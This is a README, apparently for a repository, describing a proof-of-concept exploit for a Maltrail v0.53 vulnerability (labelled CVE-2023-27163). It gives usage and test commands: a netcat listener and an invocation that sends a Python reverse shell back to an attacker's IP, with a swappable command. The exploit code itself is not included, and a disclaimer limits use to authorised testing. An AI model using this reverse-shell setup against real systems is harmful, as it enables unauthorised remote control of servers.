# CVE-2023-27163
PoC for 2023-27163 Maltrail v0.53

I could not get the other PoCs to work correctly so I put this one together.  Very similar to others but uses requests instead of subprocess.

Uses a python3 rev shell, but the `command` variable inside the `send_data` method can be changed to whatever is needed. 

## Usage
```bash
python3 explpoit.py <attack_box_ip> <attack_box_port> <target_url>
```

## Testing

**Start Listener Box**
```bash
nc -nlvp 1337
```

**run the exploit**
```bash
python3 exploit.py 1.2.3.4. 1337 http://vulnerable-maltrail.local
```

## Disclaimer
This is intended for educational purposes and legal use only.
Always obtain proper authorization before performing penetration testing or exploiting vulnerabilities.

